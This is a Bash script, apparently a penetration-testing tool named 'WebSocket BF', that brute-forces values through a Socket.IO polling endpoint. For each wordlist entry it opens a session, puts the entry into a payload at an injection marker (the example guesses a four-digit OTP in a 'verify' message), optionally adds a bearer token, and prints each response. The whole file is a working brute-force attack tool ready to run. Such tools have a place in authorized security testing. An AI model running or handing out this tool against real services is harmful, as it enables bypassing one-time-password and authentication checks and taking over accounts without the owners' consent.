#!/bin/bash

start=$(date "+%s.%N")

function basic () {
	echo "WebSocket BF v1.0 ( github.com/ivan-sincek/websocket-bf )"
	echo ""
	echo "--- Without token ---"
	echo "Usage:   ./websocket_bf.sh -d domain              -w wordlist             -p payload"
	echo "Example: ./websocket_bf.sh -d https://example.com -w all_numeric_four.txt -p '42[\"verify\",\"{\\\"otp\\\":\\\"<injection>\\\"}\"]'"
	echo ""
	echo "--- With token ---"
	echo "Usage:   ./websocket_bf.sh -d domain              -w wordlist             -p payload                                    -t token"
	echo "Example: ./websocket_bf.sh -d https://example.com -w all_numeric_four.txt -p '42[\"verify\",\"{\\\"otp\\\":\\\"<injection>\\\"}\"]' -t xxxxx.yyyyy.zzzzz"
}

function advanced () {
	basic
	echo ""
	echo "DESCRIPTION"
	echo "    Brute force a REST API query through WebSocket"
	echo "DOMAIN"
	echo "    Specify a target domain and protocol"
	echo "    -d <domain> - https://example.com | https://192.168.1.10 | etc."
	echo "WORDLIST"
	echo "    Specify a wordlist to use"
	echo "    -w <wordlist> - all_numeric_four.txt | etc."
	echo "PAYLOAD"
	echo "    Specify a query/payload to brute force"
	echo "    Make sure to enclose it in single quotes"
	echo "    Mark the injection point with <injection>"
	echo "    -p <payload> - '42[\"verify\",\"{\\\"otp\\\":\\\"<injection>\\\"}\"]' | etc."
	echo "TOKEN"
	echo "    Specify a token to use"
	echo "    -t <token> - xxxxx.yyyyy.zzzzz | etc."
}

domain=""
wordlist=""
payload=""
token=""
proceed=true

# $1 (required) - key
# $2 (required) - value
function validate () {
	if [[ $1 == "-d" && -z $domain ]]; then
		domain=$2
	elif [[ $1 == "-w" && -z $wordlist ]]; then
		wordlist=$2
		if [[ ! -e $wordlist ]]; then
			proceed=false
			echo "ERROR: Wordlist does not exists"
		elif [[ ! -r $wordlist ]]; then
			proceed=false
			echo "ERROR: Wordlist does not have read permission"
		elif [[ ! -s $wordlist ]]; then
			proceed=false
			echo "ERROR: Wordlist is empty"
		fi
	elif [[ $1 == "-p" && -z $payload ]]; then
		payload=$2
	elif [[ $1 == "-t" && -z $token ]]; then
		token=$2
	fi
}

missing=false

# $1 (required) - option
# $2 (required) - key
function check () {
	if [[ $1 == 1 ]]; then
		if [[ $2 != "-d" && $2 != "-w" && $2 != "-p" || -z $domain || -z $wordlist || -z $payload ]]; then
			missing=true
		fi
	elif [[ $1 == 2 ]]; then
		if [[ $2 != "-d" && $2 != "-w" && $2 != "-p" && $2 != "-t" || -z $domain || -z $wordlist || -z $payload || -z $token ]]; then
			missing=true
		fi
	fi
}

if [[ $# == 0 ]]; then
	proceed=false
	advanced
elif [[ $# == 1 ]]; then
	proceed=false
	if [[ $1 == "-h" ]]; then
		basic
	elif [[ $1 == "--help" ]]; then
		advanced
	else
		echo "ERROR: Incorrect usage"
		echo "Use -h for basic and --help for advanced info"
	fi
elif [[ $# == 6 ]]; then
	validate $1 $2
	validate $3 $4
	validate $5 $6
	check 1 $1
	check 1 $3
	check 1 $5
	if [[ $missing == true ]]; then
		proceed=false
		echo "ERROR: Missing a mandatory option (-d, -w, -p)"
		echo "Use -h for basic and --help for advanced info"
	fi
elif [[ $# == 8 ]]; then
	validate $1 $2
	validate $3 $4
	validate $5 $6
	validate $7 $8
	check 2 $1
	check 2 $3
	check 2 $5
	check 2 $7
	if [[ $missing == true ]]; then
		proceed=false
		echo "ERROR: Missing a mandatory option (-d, -w, -p, -t)"
		echo "Use -h for basic and --help for advanced info"
	fi
else
	proceed=false
	echo "ERROR: Incorrect usage"
	echo "Use -h for basic and --help for advanced info"
fi

# $1 (required) - domain
# $2 (optional) - token
function get_sid () {
	# add/modify the HTTP request headers and/or any other parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${2:-null}" "${1}/socket.io/?EIO=3&transport=polling" | gunzip -c | grep -P -o "\{[\S\s]+\}" | jq -r ".sid"
}

# $1 (required) - domain
# $2 (required) - sid
# $3 (required) - payload
# $4 (optional) - token
function send_payload () {
	# add/modify the HTTP request headers and/or any other parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${4:-null}" "${1}/socket.io/?EIO=3&transport=polling&sid=${2}" --data "${3}" | gunzip -c
}

# $1 (required) - domain
# $2 (required) - sid
# $3 (optional) - token
function fetch_results () {
	# add/modify the HTTP request headers and/or any other parameters as necessary
	# EIO       (required) - version of the Engine.IO protocol
	# transport (required) - transport being established
	curl -s -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "Authorization: Bearer ${3:-null}" "${1}/socket.io/?EIO=3&transport=polling&sid=${2}" | gunzip -c
}

if [[ $proceed == true ]]; then
	echo "########################################################################"
	echo "#                                                                      #"
	echo "#                             WebSocket BF                             #"
	echo "#                                     by Ivan Sincek                   #"
	echo "#                                                                      #"
	echo "# Brute force a REST API query through WebSocket.                      #"
	echo "# GitHub repository at github.com/ivan-sincek/websocket-bf.            #"
	echo "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #"
	echo "#                                                                      #"
	echo "########################################################################"
	count=0
	for entry in $(cat $wordlist); do
		count=$((count + 1))
		sid=$(get_sid $domain $token)
		echo ""
		echo "#${count} | entry: ${entry} | sid: ${sid}"
		echo ""
		data="${payload//<injection>/$entry}"
		data="${#data}:${data}"
		send_payload $domain $sid $data $token
		results=$(fetch_results $domain $sid $token)
		echo $results
	done
	end=$(date "+%s.%N")
	runtime=$(echo "${end} - ${start}" | bc -l)
	echo ""
	echo "Script has finished in ${runtime}"
fi
